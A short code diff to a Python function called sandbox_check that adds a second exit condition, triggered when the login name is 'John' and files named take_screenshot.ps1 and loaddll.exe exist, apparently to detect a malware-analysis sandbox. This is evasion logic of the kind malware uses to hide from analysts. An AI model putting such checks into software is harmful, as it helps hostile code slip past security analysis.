@@ -28,7 +28,10 @@ def sandbox_check():
     ]
 
     if socket.gethostname in hostnames:
-        exit()
+        exit(1)
+
+    if os.getlogin() == 'John' and os.path.exists('C:\\take_screenshot.ps1') and os.path.exists("C:\\loaddll.exe"):
+        exit(1)
 
 
 sandbox_check()
